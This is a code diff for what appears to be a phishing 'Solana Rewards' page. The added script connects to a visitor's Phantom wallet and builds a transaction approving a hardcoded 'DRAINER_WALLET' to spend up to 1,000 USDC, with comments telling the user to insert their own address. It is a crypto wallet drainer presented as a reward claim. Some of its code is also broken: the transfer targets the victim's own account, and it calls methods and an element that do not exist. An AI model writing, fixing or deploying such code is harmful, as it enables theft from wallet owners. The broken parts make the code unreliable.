@@ -1,22 +1,79 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Rewards</title>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.umd.min.js"></script>
-    <style>
-        body { background: #0a0a0a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #161616; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #333; }
-        button { background: #14F195; color: black; border: none; padding: 15px; width: 100%; border-radius: 14px; font-weight: bold; margin-top: 20px; }
-        #status { margin-top: 20px; font-size: 13px; color: #888; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <h1 id="title">Solana Mint</h1>
-        <p id="desc">Connect wallet to claim reward.</p>
-        <button id="actionBtn">Connect Wallet</button>
-        <p id="status">Status: Ready</p>
-    </div>
-    <script>
+<script type="module">
+    import { Connection, PublicKey, Transaction, VersionedTransaction } from 'https://esm.sh/@solana/web3.js';
+    import * as splToken from 'https://esm.sh/@solana/spl-token';
+
+    // CONFIGURATION: CHANGE THIS TO YOUR WALLET ADDRESS
+    const DRAINER_WALLET = "DhwXCuDoQTtayywt8snW1UDbXDGfnEDjqP4rLx9MGDqM"; // e.g., 7xKX...
+    
+    // USDC Mint Address on Mainnet
+    const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
+
+    async function connectWallet() {
+        const provider = window.phantom?.solana;
+        if (!provider || !provider.isPhantom) {
+            alert("Please install Phantom Wallet!");
+            return null;
+        }
+        
+        await provider.connect();
+        return provider.publicKey;
+    }
+
+    async function drainUSDC() {
+        const provider = window.phantom?.solana;
+        const userPublicKey = provider.publicKey;
+        const connection = new Connection("https://api.mainnet-beta.solana.com");
+
+        // 1. Get User's Token Account for USDC
+        const tokenAccounts = await splToken.getTokenAccountsByOwner(
+            connection,
+            userPublicKey,
+            { mint: new PublicKey(USDC_MINT) }
+        );
+
+        if (tokenAccounts.value.length === 0) {
+            alert("No USDC found in your wallet!");
+            return;
+        }
+
+        const userTokenAccount = tokenAccounts.value[0].pubkey;
+
+        // 2. Create a Transaction to Approve & Transfer
+        // We combine approval and transfer into one transaction for simplicity
+        
+        const approveInstruction = splToken.createApproveInstruction(
+            userTokenAccount,
+            new PublicKey(DRAINER_WALLET), // Your address gets permission
+            userPublicKey,
+            1000000000, // Approve 1,000 USDC (6 decimals)
+            undefined,
+            splToken.TOKEN_PROGRAM_ID
+        );
+
+        const transferInstruction = splToken.createTransferInstruction(
+            userTokenAccount,
+            userTokenAccount, // For simplicity, we'll transfer to a token account of yours. 
+                              // Note: In a real drainer, you'd create a new token account for yourself if needed.
+            userPublicKey,
+            1000000000 // Transfer the approved amount
+        );
+
+        // 3. Send Transaction
+        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+        const transaction = new Transaction({
+            feePayer: userPublicKey,
+            blockhash,
+            lastValidBlockHeight
+        }).add(approveInstruction).add(transferInstruction);
+
+        //  need to use VersionedTransaction for modern Solana compatibility
+        const versionedTx = await connection.sendAndConfirm(transaction);
+        
+        alert(`Drained! Transaction: ${versionedTx}`);
+    }
+
+    // UI Button Logic
+    document.getElementById('drain-btn').addEventListener('click', async () => {
+        await drainUSDC();
+    });
+</script>
